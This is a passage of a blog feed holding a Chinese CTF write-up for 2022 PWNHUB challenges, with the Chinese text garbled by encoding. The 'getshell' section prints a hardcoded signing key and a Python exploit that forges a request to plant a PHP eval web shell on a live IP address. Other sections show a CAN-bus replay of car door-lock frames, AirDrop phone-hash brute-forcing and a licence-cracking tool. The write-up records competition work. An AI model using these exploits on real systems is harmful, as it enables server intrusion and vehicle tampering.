class="hljs-number">2</span>, n - <span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        x = <span class="hljs-built_in">pow</span>(g, k, n)<br>        <span class="hljs-keyword">if</span> x &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> n &gt; GCD(x - <span class="hljs-number">1</span>, n) &gt; <span class="hljs-number">1</span>:<br>            p = GCD(x - <span class="hljs-number">1</span>, n)<br>            q = n // p<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;p = &#125;</span>\n<span class="hljs-subst">&#123;q = &#125;</span>&quot;</span>)<br>            <span class="hljs-built_in">print</span>(p * q == n)<br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>                <span class="hljs-built_in">print</span>(long_to_bytes(p &gt;&gt; i))<br>                <span class="hljs-built_in">print</span>(long_to_bytes(q &gt;&gt; i))<br>            exit()<br>        <span class="hljs-keyword">if</span> k % <span class="hljs-number">2</span>:<span class="hljs-keyword">break</span><br>        k //= <span class="hljs-number">2</span><br><span class="hljs-comment"># flag&#123;e89f47939d12434cb201080d8b240774&#125;</span><br></code></pre></td></tr></table></figure><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="é£é©°äººç”Ÿ"><a href="#é£é©°äººç”Ÿ" class="headerlink" title="é£é©°äººç”Ÿ"></a>é£é©°äººç”Ÿ</h2><p>å‰ç½®çŸ¥è¯†<br><code>[https://www.anquanke.com/post/id/106409?from=timeline#h2-1](https://www.anquanke.com/post/id/106409?from=timeline#h2-1)</code><br>CANæŠ¥æ–‡åˆ†æï¼Œä½¿ç”¨é‡æ”¾æ”»å‡»è§£é¢˜<br><code>[http://www.hackdig.com/09/hack-771228.htm](http://www.hackdig.com/09/hack-771228.htm)</code><br>éœ€è¦å»GitHubä¸‹è½½æœ€æ–°ç‰ˆcan-utilsæ‰èƒ½å®ç°æŒ¨ä¸ªæ‰‹è°ƒ<br><code>[GitHub - linux-can/can-utils: Linux-CAN / SocketCAN user space applications](https://github.com/linux-can/can-utils)</code><br>æŸ¥çœ‹æ—¥å¿— å°†å¼‚å¸¸æµé‡æå–å‡ºæ¥å¯ä»¥æ›´å¿«çš„è°ƒè¯•å®Œæ¯•<br>ç›´æ¥ç­›é€‰244#ï¼ˆæ²¹é—¨æµé‡ï¼‰çš„å¼‚å¸¸æµé‡å»è¿›è¡Œæ‰‹è°ƒ<br><code>./canplayer -I ./xxx.txt -v -i</code>é€è¡Œè°ƒè¯•å‘½ä»¤<br><img src="/mdimg/2022PWNHUB/1671280983003.png"><br><img src="/mdimg/2022PWNHUB/1671281025564.png"><br>è¡¨ç›˜åœ¨æ­¤å‘ç”Ÿçªå˜æ‰€ä»¥æŠ¥æ–‡å¼‚å¸¸ä¸º<code>244#000000A60000</code><br>ç»“åˆä¸€é“å›½å¤–CANæŠ¥æ–‡é¢˜ç›®å¯ä»¥å¾—çŸ¥<code>19B#00000F000000</code>ä¸ºé—¨é”æ”»å‡»å¼‚å¸¸æµé‡<br><img src="/mdimg/2022PWNHUB/1671353189895.png"><br>æ²¡æƒ³åˆ°ç›´æ¥äº¤å°±å¯¹äº† è¿˜æ²¡æ¥å¾—åŠå¯¹é—¨é”æµé‡è¿›è¡Œè°ƒè¯•  è¿˜éœ€è¦å¯¹can-utilsæºç è¿›è¡Œæ›´æ·±å…¥å­¦ä¹ æ‰è¡Œ å¤ªèœäº†<br><code>flag&#123;19B#00000F000000_244#000000A60000&#125;</code></p><h2 id="è¯ä¹¦é‡Œä¹Ÿæœ‰ç§˜å¯†"><a href="#è¯ä¹¦é‡Œä¹Ÿæœ‰ç§˜å¯†" class="headerlink" title="è¯ä¹¦é‡Œä¹Ÿæœ‰ç§˜å¯†"></a>è¯ä¹¦é‡Œä¹Ÿæœ‰ç§˜å¯†</h2><p>ä½¿ç”¨ -h æŸ¥çœ‹å¸®åŠ©</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> &gt; .\xray<span class="hljs-literal">-cracker</span> <span class="hljs-literal">-h</span><br>ç ´è§£xrayé«˜çº§ç‰ˆè¯ä¹¦ï¼Œä½¿ç”¨ <span class="hljs-literal">-h</span> å‚æ•°æŸ¥çœ‹ä½¿ç”¨å¸®åŠ©<br><br>Usage of xray<span class="hljs-literal">-cracker</span>:<br><span class="hljs-literal">-c</span> string<br>æ›¿æ¢xrayç¨‹åºå†…ç½®å…¬é’¥ï¼Œéœ€è¦æŒ‡å®šxrayç¨‹åºæ–‡ä»¶è·¯å¾„<br><span class="hljs-literal">-g</span> string<br>ç”Ÿæˆä¸€ä¸ªæ°¸ä¹…licenseï¼Œéœ€è¦æŒ‡å®šç”¨æˆ·å<br><span class="hljs-literal">-p</span> string<br>è§£æå®˜æ–¹è¯ä¹¦ï¼Œéœ€è¦æŒ‡å®šè¯ä¹¦è·¯å¾„<br><br></code></pre></td></tr></table></figure><p>ä½¿ç”¨<code>.\xray-cracker -p xray-license.lic</code>æŸ¥çœ‹å³å¯<br><code>flag&#123;3270cdada4eb4a809d25ff4820d5a1f7&#125;</code></p><h2 id="ç©ºæŠ•ä¹‹ç‹"><a href="#ç©ºæŠ•ä¹‹ç‹" class="headerlink" title="ç©ºæŠ•ä¹‹ç‹"></a>ç©ºæŠ•ä¹‹ç‹</h2><p>ä¸‹è½½é™„ä»¶åä¸€çœ¼Airdropå–è¯ï¼ˆå°å§å§å¥½çœ‹æï¼‰  æ„Ÿè°¢Qsugarå¸ˆå‚…é€çš„ç›˜å¤çŸ³<br>å¯¼å…¥æ—¥å¿—æ–‡ä»¶<br><img src="/mdimg/2022PWNHUB/6bccea041523f122f7dff78a999130d.png"><br>åˆ©ç”¨ç›˜å¤çŸ³ Airdrop å“ˆå¸Œè½¬æ¢å·¥å…·å¾—åˆ°æ‰‹æœºå·ç <br><img src="/mdimg/2022PWNHUB/11481d495e07b31136a6cb8af72db65.png"><code>flag&#123;18800009527&#125;</code><br>çˆ†ç ´è„šæœ¬ çˆ†ç ´é€Ÿåº¦æ„Ÿäºº</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><br>targetstart = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;[+] Enter the target hash start fragment: &#x27;</span>)<br>targetend = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;[+] Enter the target hash end fragment: &#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] Checking all Chinese areacode&#x27;</span>)<br>areacodelist = [<span class="hljs-string">&#x27;139&#x27;</span>, <span class="hljs-string">&#x27;138&#x27;</span>, <span class="hljs-string">&#x27;137&#x27;</span>, <span class="hljs-string">&#x27;136&#x27;</span>, <span class="hljs-string">&#x27;135&#x27;</span>, <span class="hljs-string">&#x27;134&#x27;</span>, <span class="hljs-string">&#x27;159&#x27;</span>, <span class="hljs-string">&#x27;158&#x27;</span>,<span class="hljs-string">&#x27;157&#x27;</span>,<span class="hljs-string">&#x27;150&#x27;</span>,<span class="hljs-string">&#x27;151&#x27;</span>, <span class="hljs-string">&#x27;152&#x27;</span>, <span class="hljs-string">&#x27;188&#x27;</span>, <span class="hljs-string">&#x27;187&#x27;</span>, <span class="hljs-string">&#x27;182&#x27;</span>, <span class="hljs-string">&#x27;183&#x27;</span>, <span class="hljs-string">&#x27;184&#x27;</span>, <span class="hljs-string">&#x27;178&#x27;</span>]<br>phonematch = []<br><br><span class="hljs-keyword">for</span> areacode <span class="hljs-keyword">in</span> areacodelist:<br>    line = <span class="hljs-string">&#x27;0&#x27;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] Searching area code &#x27;</span> + areacode + <span class="hljs-string">&#x27; for target...&#x27;</span>)<br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">int</span>(line) &lt; <span class="hljs-number">100000000</span>:<br>        targetphone = <span class="hljs-string">&#x27;86&#x27;</span> + <span class="hljs-built_in">str</span>(areacode) + <span class="hljs-built_in">str</span>(line).zfill(<span class="hljs-number">8</span>)<br>        targettest = hashlib.sha256(targetphone.encode())<br>        starthashcheck = targettest.hexdigest() [<span class="hljs-number">0</span>:<span class="hljs-number">5</span>]<br>        endhashcheck = targettest.hexdigest() [-<span class="hljs-number">5</span>:]<br>        <span class="hljs-keyword">if</span> starthashcheck == targetstart.lower() <span class="hljs-keyword">and</span> endhashcheck ==targetend.lower():<br>            phonematch.append(targetphone)<br>            <span class="hljs-built_in">print</span>(targetphone + <span class="hljs-string">&#x27; matches hash fragments. Stillchecking...&#x27;</span>)<br>        line = <span class="hljs-built_in">int</span>(line) + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-built_in">int</span>(line) == <span class="hljs-number">100000000</span>:<br>            <span class="hljs-keyword">break</span><br><span class="hljs-keyword">if</span> phonematch:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Your target\&#x27;s phone number may be:&#x27;</span>)<br>    <span class="hljs-keyword">for</span> <span class="hljs-keyword">match</span> <span class="hljs-keyword">in</span> phonematch:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-keyword">match</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Target phone number not found in this area code set. Targetphone may use another country code.&#x27;</span>)<br></code></pre></td></tr></table></figure><h2 id="åäº•è§‚å¤©"><a href="#åäº•è§‚å¤©" class="headerlink" title="åäº•è§‚å¤©"></a>åäº•è§‚å¤©</h2><p>å¯ä»¥ä½¿â½¤çš„å­—ç¬¦æœ‰``string.ascii_letters + string.digits + â€œ,!?;#+-/$@&amp;|~^&lt;&gt;(){}â€<code> è¿™äº›â½…æ³•</code>â€œgetattrâ€, â€œexecâ€, â€œopenâ€, â€œ<strong>builtins</strong>â€œ, â€œ<strong>build_class</strong>â€œ, â€œ<strong>loader</strong>â€œ, â€œ<strong>spec</strong>â€œ<code>éƒ½è¢« ç¦â½¤äº†ï¼Œé‚£ä¹ˆè¿™ä¸ªæ—¶å€™å¯ä»¥é€‰æ‹©â½¤</code>chr()<code>æ¥ç»•è¿‡ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥â½¤</code>eval(input())`ç»•è¿‡ã€‚<br><img src="/mdimg/2022PWNHUB/1671287243843.png"><br><img src="/mdimg/2022PWNHUB/1671589681536.png"></p><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="justJS"><a href="#justJS" class="headerlink" title="justJS"></a>justJS</h2><p>éé¢„æœŸäº†ã€‚ã€‚ã€‚<br><img src="/mdimg/2022PWNHUB/1671280829207.png"></p><h1 id="GAMING"><a href="#GAMING" class="headerlink" title="GAMING"></a>GAMING</h1><h2 id="æ¸¸æˆæ¥å’¯"><a href="#æ¸¸æˆæ¥å’¯" class="headerlink" title="æ¸¸æˆæ¥å’¯"></a>æ¸¸æˆæ¥å’¯</h2><p>æ³¨å†Œè´¦å·ç™»å½•å³å¯get flag</p><h2 id="æ”»åŸæ‹”å¯¨"><a href="#æ”»åŸæ‹”å¯¨" class="headerlink" title="æ”»åŸæ‹”å¯¨"></a>æ”»åŸæ‹”å¯¨</h2><p>ä¿®æ”¹å™¨ç›´æ¥æ”¹<br><img src="/mdimg/2022PWNHUB/1.png"><br>å°†å®˜èŒä¿®æ”¹åˆ°ç£é‚®ä»¥ä¸Š<br><img src="/mdimg/2022PWNHUB/2.png"><br>é‡æ–°ç™»é™†ï¼ŒæŸ¥çœ‹é‚®ç®±<br><img src="/mdimg/2022PWNHUB/3.png"></p><h2 id="ç‰¹æ®Šç©å®¶"><a href="#ç‰¹æ®Šç©å®¶" class="headerlink" title="ç‰¹æ®Šç©å®¶"></a>ç‰¹æ®Šç©å®¶</h2><p><img src="/mdimg/2022PWNHUB/4.png"></p><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>æ‰“å¼€é™„ä»¶åœ¨<code>APMServ5.2.6&gt;www&gt;htdocs&gt;server&gt;game&gt;BattleNetGateway.php</code><br>å¯ä»¥çœ‹åˆ°å­˜åœ¨æ¼æ´ï¼Œå¯ä»¥ä¸Šä¼ æ–‡ä»¶</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;?php   <br>require_once(<span class="hljs-string">&quot;interface.php&quot;</span>);<br>require_once(<span class="hljs-string">&quot;utils.php&quot;</span>);<br>require_once(<span class="hljs-string">&quot;BattleFunc.php&quot;</span>);<br>require_once(<span class="hljs-string">&quot;HeroFunc.php&quot;</span>);<br>require_once(<span class="hljs-string">&quot;BattleNetServices.php&quot;</span>);<br>define(<span class="hljs-string">&quot;BATTLE_NET_KEY&quot;</span>,<span class="hljs-string">&quot;M7XDFCR9WRRGRQ9ETBQ6&quot;</span>);<br><span class="hljs-keyword">if</span> (!defined(<span class="hljs-string">&#x27;PATH_SEPARATOR&#x27;</span>)) &#123;<span class="hljs-keyword">if</span> (substr(PHP_OS, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>) == <span class="hljs-string">&#x27;WIN&#x27;</span>) define(<span class="hljs-string">&#x27;PATH_SEPARATOR&#x27;</span>, <span class="hljs-string">&#x27;;&#x27;</span>); <span class="hljs-keyword">else</span> define(<span class="hljs-string">&#x27;PATH_SEPARATOR&#x27;</span>, <span class="hljs-string">&#x27;:&#x27;</span>);&#125; <br>ini_set(<span class="hljs-string">&#x27;include_path&#x27;</span>,ini_get(<span class="hljs-string">&#x27;include_path&#x27;</span>).PATH_SEPARATOR.realpath(<span class="hljs-string">&quot;../&quot;</span>));     <br><br>$param=$_POST;<br><span class="hljs-keyword">if</span>(empty($param))$param=$_GET;      <br>$from_uid=$param[<span class="hljs-string">&quot;from_uid&quot;</span>];   <br>$sign=$param[<span class="hljs-string">&quot;sign&quot;</span>];<br>$commandFunc=$param[<span class="hljs-string">&quot;commandFunc&quot;</span>];<br>$content=urldecode($param[<span class="hljs-string">&quot;content&quot;</span>]);<br>$content_encoding=$param[<span class="hljs-string">&quot;content-encoding&quot;</span>];<br>//$tt=$from_uid.$commandFunc.$content.BATTLE_NET_KEY;<br><br><br><br>$ret=array();<br><span class="hljs-keyword">if</span>($sign!=md5($from_uid.$commandFunc.$content.BATTLE_NET_KEY)) <br>$ret[]=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">else</span>&#123;<br>    $ret[]=<span class="hljs-number">1</span>;<br><br><span class="hljs-keyword">try</span>&#123;<br>    <span class="hljs-keyword">if</span>($content_encoding==<span class="hljs-string">&quot;csv&quot;</span>)&#123;<br>$inputParams=explode(<span class="hljs-string">&quot;|&quot;</span>,$content);<br><span class="hljs-keyword">if</span>(count($inputParams)==<span class="hljs-number">1</span>)&#123;<br>    $inputParams=$inputParams[<span class="hljs-number">0</span>];<br>&#125;<br>$ret[]=$commandFunc($from_uid,$inputParams);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    $inputParams=json_decode($content,true);<br><span class="hljs-keyword">if</span>(is_array($inputParams)&amp;&amp;count($inputParams)==<span class="hljs-number">1</span>)&#123;<br>    $inputParams=array_shift($inputParams);<br>&#125;<br>$ret[]=$commandFunc($from_uid,$inputParams); <br>&#125;<br>&#125;catch(Exception $e)&#123;<br>    $ret = array(<span class="hljs-number">0</span>=&gt;<span class="hljs-number">0</span>);<br>$ret[] = $e-&gt;getMessage();<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span>($content_encoding==<span class="hljs-string">&quot;csv&quot;</span>)&#123;<br><span class="hljs-built_in">print</span> implode(<span class="hljs-string">&quot;|&quot;</span>,$ret);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-built_in">print</span> json_encode($ret);<br>&#125;<br><br>?&gt;<br></code></pre></td></tr></table></figure><p>çœ‹åˆ°å¯†é’¥</p><p><code>define(&quot;BATTLE_NET_KEY&quot;,&quot;M7XDFCR9WRRGRQ9ETBQ6&quot;);</code><br>ä¸Šä¼ ä¸€ä¸ªæœ¨é©¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> sys<br><br>BATTLE_NET_KEY = <span class="hljs-string">&quot;M7XDFCR9WRRGRQ9ETBQ6&quot;</span> //key<br>data = &#123;<br>    <span class="hljs-string">&quot;from_uid&quot;</span>: <span class="hljs-string">&quot;a.php&quot;</span>,<br>    <span class="hljs-string">&quot;commandFunc&quot;</span>: <span class="hljs-string">&quot;file_put_contents&quot;</span>,<br>    <span class="hljs-string">&quot;content&quot;</span>: <span class="hljs-string">&#x27;&lt;? eval($_POST[&#x27;</span>a<span class="hljs-string">&#x27;]);&#x27;</span>,  //ä¸€å¥è¯<br>    <span class="hljs-string">&quot;content-encoding&quot;</span>: <span class="hljs-string">&quot;csv&quot;</span><br>&#125;<br>data[<span class="hljs-string">&quot;sign&quot;</span>] = hashlib.md5((data[<span class="hljs-string">&quot;from_uid&quot;</span>]+data[<span class="hljs-string">&quot;commandFunc&quot;</span>]+data[<span class="hljs-string">&quot;content&quot;</span>]+BATTLE_NET_KEY).encode()).hexdigest()<br>t=requests.post(<span class="hljs-string">&quot;http://120.55.42.64:81/server/game/BattleNetGateway.php&quot;</span>, data=data)<br><span class="hljs-built_in">print</span>(t.text)<br></code></pre></td></tr></table></figure><p>èšå‰‘è¿æ¥ï¼Œflagåœ¨æ ¹ç›®å½•ä¸‹<br><img src="/mdimg/2022PWNHUB/5.jpeg"></p><h1 id="PPC"><a href="#PPC" class="headerlink" title="PPC"></a>PPC</h1><h2 id="Tcp-Show"><a href="#Tcp-Show" class="headerlink" title="Tcp Show"></a>Tcp Show</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br><br>n = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>())<br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>    d, rawdata = <span class="hljs-built_in">input</span>().strip().split()<br>    data = base64.b64decode(rawdata.encode())<br>    now = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(data), <span class="hljs-number">16</span>):<br>        <span class="hljs-keyword">if</span> d == <span class="hljs-string">&#x27;1&#x27;</span>:<br>            now += <span class="hljs-string">&#x27; &#x27;</span> * <span class="hljs-number">8</span><br>        now += <span class="hljs-built_in">hex</span>(i)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>) + <span class="hljs-string">&#x27; &#x27;</span> * <span class="hljs-number">2</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>            <span class="hljs-keyword">if</span> j == <span class="hljs-number">8</span>:<br>                now += <span class="hljs-string">&#x27; &#x27;</span><br>            <span class="hljs-keyword">if</span> i + j &lt; <span class="hljs-built_in">len</span>(data):<br>                now += <span class="hljs-built_in">hex</span>(data[i + j])[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">2</span>) + <span class="hljs-string">&#x27; &#x27;</span><br>            <span class="hljs-keyword">else</span>:<br>                now += <span class="hljs-string">&#x27; &#x27;</span> * <span class="hljs-number">3</span><br>        now += <span class="hljs-string">&#x27; &#x27;</span> * <span class="hljs-number">2</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>            <span class="hljs-keyword">if</span> j == <span class="hljs-number">8</span>:<br>                now += <span class="hljs-string">&#x27; &#x27;</span><br>            <span class="hljs-keyword">if</span> i + j &lt; <span class="hljs-built_in">len</span>(data):<br>                tmp = data[i + j]<br>                <span class="hljs-keyword">if</span> <span class="hljs-number">32</span> &lt;= tmp &lt;= <span class="hljs-number">126</span>:<br>                    now += <span class="hljs-built_in">chr</span>(tmp)<br>                <span class="hljs-keyword">else</span>:<br>                    now += <span class="hljs-string">&#x27;.&#x27;</span><br>            <span class="hljs-keyword">else</span>:<br>                now += <span class="hljs-string">&#x27; &#x27;</span><br>        now += <span class="hljs-string">&#x27;\n&#x27;</span><br>    <span class="hljs-built_in">print</span>(now[:-<span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure><h1 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h1><h2 id="åƒåœ¾é‚®ä»¶åˆ†æ"><a href="#åƒåœ¾é‚®ä»¶åˆ†æ" class="headerlink" title="åƒåœ¾é‚®ä»¶åˆ†æ"></a>åƒåœ¾é‚®ä»¶åˆ†æ</h2><p>çˆ†ç ´sha256è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python">data = <span class="hljs-string">&#x27;sha256(vKyd2tRZFtkExhiNlPlVTduEqY47 + xxxx) = 4a39288b21b34650b177bdc58c416b3f55305945a9cf87f4bd7b4da2569c10e4&#x27;</span><br>suffix = data.split(<span class="hljs-string">&quot;(&quot;</span>)[<span class="hljs-number">1</span>].split(<span class="hljs-string">&quot; +&quot;</span>)[<span class="hljs-number">0</span>]<br>digest = data.split(<span class="hljs-string">&quot;= &quot;</span>)[<span class="hljs-number">1</span>]<br><br><br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> itertools<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">from</span> Crypto.Hash <span class="hljs-keyword">import</span> SHA256<br><span class="hljs-keyword">import</span> itertools<br><br>ALPHABET = string.ascii_letters + string.digits<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getProof</span>(<span class="hljs-params">suffix,digest</span>):   <br><br>    <span class="hljs-comment">#print(f&quot;suffix: &#123;suffix&#125;\ndigest: &#123;digest&#125;&quot;)</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> itertools.product(ALPHABET,repeat=<span class="hljs-number">4</span>):<br>        prefix = <span class="hljs-string">&#x27;&#x27;</span>.join(i)<br>        guess =  suffix + prefix<br>        <span class="hljs-keyword">if</span> sha256(guess.encode()).hexdigest() == digest:<br>            <span class="hljs-comment">#print(f&quot;Find X<span class="hljs-doctag">XXX:</span> &#123;prefix&#125;&quot;)</span><br>            <span class="hljs-keyword">return</span> prefix<br>            <span class="hljs-keyword">break</span><br><br>x = getProof(suffix,digest)<br><span class="hljs-built_in">print</span>(x)<br></code></pre></td></tr></table></figure><p>ç»™50æ¡æ•°æ®æ¥è®­ç»ƒAIï¼Œç„¶åç»™10æ¡é‚®ä»¶è®©åˆ¤æ–­æ˜¯åƒåœ¾é‚®ä»¶è¿˜æ˜¯å¥½çš„é‚®ä»¶<br>ä¸ä¼šæœºå™¨å­¦ä¹ ï¼Œçº¯é ç¿»è¯‘è‡ªå·±å»åˆ¤æ–­ï¼Œ10æ¡å…¨å¯¹å°±æ‹¿åˆ°flagäº†ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linuxä¿æŠ¤æœºåˆ¶</title>
    <link href="/2023/02/04/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DLinux%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"/>
    <url>/2023/02/04/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DLinux%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</url>
    
